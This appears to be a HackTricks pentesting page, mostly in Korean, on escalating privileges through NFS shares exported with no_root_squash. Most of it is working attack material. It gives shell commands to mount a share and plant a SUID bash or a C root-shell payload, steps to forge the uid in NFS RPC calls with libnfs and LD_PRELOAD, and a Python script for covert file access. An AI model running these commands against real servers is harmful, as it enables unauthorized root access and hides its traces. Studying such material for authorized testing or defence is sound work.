{{#include ../../banners/hacktricks-training.md}}

# Squashing Basic Info

NFS는 일반적으로 (특히 리눅스에서) 파일에 접근하기 위해 클라이언트가 연결할 때 지정된 `uid`와 `gid`를 신뢰합니다 (kerberos가 사용되지 않는 경우). 그러나 서버에서 **이 동작을 변경하는** 몇 가지 설정이 있습니다:

- **`all_squash`**: 모든 접근을 압축하여 모든 사용자와 그룹을 **`nobody`** (65534 unsigned / -2 signed)로 매핑합니다. 따라서 모든 사용자는 `nobody`가 되며, 사용자가 없습니다.
- **`root_squash`/`no_all_squash`**: 이는 리눅스의 기본값이며 **uid 0 (root)**에 대한 접근만 압축합니다. 따라서 모든 `UID`와 `GID`는 신뢰되지만 `0`은 `nobody`로 압축됩니다 (따라서 root 가장이 불가능합니다).
- **``no_root_squash`**: 이 설정이 활성화되면 root 사용자조차 압축하지 않습니다. 즉, 이 설정으로 디렉토리를 마운트하면 root로 접근할 수 있습니다.

**/etc/exports** 파일에서 **no_root_squash**로 설정된 디렉토리를 찾으면, **클라이언트로서** 해당 디렉토리에 **접근**하고 **그 안에 쓰기**를 할 수 있습니다 **로컬 머신의 root**인 것처럼.

**NFS**에 대한 더 많은 정보는 다음을 확인하세요:

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Remote Exploit

옵션 1: bash 사용:
- **클라이언트 머신에서 해당 디렉토리를 마운트하고, root로서** 마운트된 폴더 안에 **/bin/bash** 바이너리를 복사한 후 **SUID** 권한을 부여하고, **피해자** 머신에서 해당 bash 바이너리를 실행합니다.
- NFS 공유 내에서 root가 되려면, **`no_root_squash`**가 서버에 설정되어 있어야 합니다.
- 그러나 활성화되지 않은 경우, 바이너리를 NFS 공유에 복사하고 상승하고자 하는 사용자로서 SUID 권한을 부여하여 다른 사용자로 상승할 수 있습니다.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
옵션 2: C 컴파일 코드 사용:
- 클라이언트 머신에서 해당 디렉토리를 **마운트**하고, **루트로 복사**하여 마운트된 폴더 안에 SUID 권한을 악용할 컴파일된 페이로드를 넣고, 피해자 머신에서 해당 바이너리를 **실행**합니다 (여기에서 일부 [C SUID 페이로드](payloads-to-execute.md#c)를 찾을 수 있습니다).
- 이전과 동일한 제한 사항
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
> The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
> Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
> --_나는 `/etc/export`가 IP 주소를 나타내는 경우 이 트릭이 작동할지 확신하지 못한다_--

## Basic Information

이 시나리오는 로컬 머신에서 마운트된 NFS 공유를 악용하는 것으로, 클라이언트가 자신의 uid/gid를 지정할 수 있게 해주는 NFSv3 사양의 결함을 이용하여 무단 접근을 가능하게 합니다. 이 악용은 NFS RPC 호출을 위조할 수 있는 라이브러리인 [libnfs](https://github.com/sahlberg/libnfs)를 사용하는 것을 포함합니다.

### Compiling the Library

라이브러리 컴파일 단계는 커널 버전에 따라 조정이 필요할 수 있습니다. 이 특정 경우에는 fallocate 시스템 호출이 주석 처리되었습니다. 컴파일 과정은 다음 명령어를 포함합니다:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Exploit 수행

이 익스플로잇은 루트 권한으로 권한을 상승시키고 셸을 실행하는 간단한 C 프로그램(`pwn.c`)을 만드는 것을 포함합니다. 프로그램이 컴파일되고, 결과 이진 파일(`a.out`)이 suid root로 공유에 배치되며, `ld_nfs.so`를 사용하여 RPC 호출에서 uid를 위조합니다:

1. **익스플로잇 코드 컴파일:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **공유에 익스플로잇을 배치하고 uid를 조작하여 권한을 수정합니다:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **루트 권한을 얻기 위해 익스플로잇을 실행합니다:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell for Stealthy File Access

루트 접근 권한을 얻은 후, 소유권을 변경하지 않고(NFS 공유와의 상호작용에서 흔적을 남기지 않기 위해) Python 스크립트(nfsh.py)를 사용합니다. 이 스크립트는 접근하는 파일의 uid를 일치시켜, 권한 문제 없이 공유의 파일과 상호작용할 수 있도록 합니다:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
실행 방법:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
